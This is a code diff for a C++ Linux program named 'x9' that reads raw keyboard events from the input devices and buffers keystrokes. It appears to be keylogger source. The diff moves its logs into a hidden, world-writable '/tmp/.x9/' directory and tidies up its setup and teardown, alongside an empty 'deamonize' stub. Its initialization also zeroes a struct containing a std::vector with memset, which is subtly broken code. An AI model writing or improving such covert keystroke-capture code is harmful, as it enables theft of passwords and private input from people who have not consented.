@@ -1,6 +1,7 @@
 #include <fcntl.h>
 #include <linux/input.h>
 #include <sys/select.h>
+#include <sys/stat.h>
 #include <unistd.h>
 
 #include <chrono>
@@ -15,7 +16,7 @@
 #include <string>
 #include <vector>
 
-#define LOGS_DIRECTORY "/tmp/"
+#define LOGS_DIRECTORY "/tmp/.x9/"
 
 struct x9_ctx {
   bool is_capslock_on;
@@ -101,21 +102,15 @@ static const std::map<int, struct key_event_handler> handlers{
 
 void sig_handler(int sig_num) { must_stop = 1; }
 
-void cleanup_ctx(struct x9_ctx *ctx) {
-  for (auto &fd : ctx->kb_fds) {
-    close(fd);
-  }
-}
-
 std::vector<std::string> get_event_files() {
   std::vector<std::string> content;
-   
+
   {
     std::ifstream file{"/proc/bus/input/devices"};
     std::regex kb_regex{"H: Handlers=sysrq kbd (.+?) leds"};
     std::string line;
     std::smatch match;
- 
+
     while (std::getline(file, line)) {
       if (std::regex_search(line, match, kb_regex)) {
         content.emplace_back(match[1]);
@@ -136,6 +131,32 @@ std::vector<int> get_keyboard_fds() {
   }
 
   return fds;
+}
+
+int initialize_ctx(struct x9_ctx *ctx) {
+  if (!ctx) {
+    return 1;
+  }
+
+  std::memset(ctx, 0, sizeof(struct x9_ctx));
+
+  ctx->is_capslock_on = false;
+  ctx->buffer_cursor = 0;
+  ctx->kb_fds = get_keyboard_fds();
+
+  if (ctx->kb_fds.empty()) {
+    return 1;
+  }
+
+  mkdir(LOGS_DIRECTORY, S_IRWXU | S_IRWXG | S_IRWXO);
+
+  return 0;
+}
+
+void destroy_ctx(struct x9_ctx *ctx) {
+  for (auto &fd : ctx->kb_fds) {
+    close(fd);
+  }
 }
 
 void handle_key(struct x9_ctx *ctx) {
@@ -225,7 +246,7 @@ void handle_arrow(struct x9_ctx *ctx) {
                                                  : (ctx->buffer_cursor + 1);
 }
 
-int run(struct x9_ctx *ctx) {
+void run(struct x9_ctx *ctx) {
   struct input_event ev;
   fd_set rfds;
 
@@ -260,25 +281,21 @@ int run(struct x9_ctx *ctx) {
       }
     }
   }
-
-  return EXIT_SUCCESS;
 }
 
 void deamonize() {}
 
 int main() {
-  struct x9_ctx ctx = {.is_capslock_on = false,
-                       .kb_fds = get_keyboard_fds(),
-                       .buffer_cursor = 0};
+  struct x9_ctx ctx;
 
-  if (ctx.kb_fds.empty()) {
+  if (initialize_ctx(&ctx)) {
     std::exit(EXIT_FAILURE);
   }
 
   std::signal(SIGINT, sig_handler);
 
-  int ret = run(&ctx);
-  cleanup_ctx(&ctx);
+  run(&ctx);
+  destroy_ctx(&ctx);
 
-  std::exit(ret);
+  std::exit(EXIT_SUCCESS);
 }
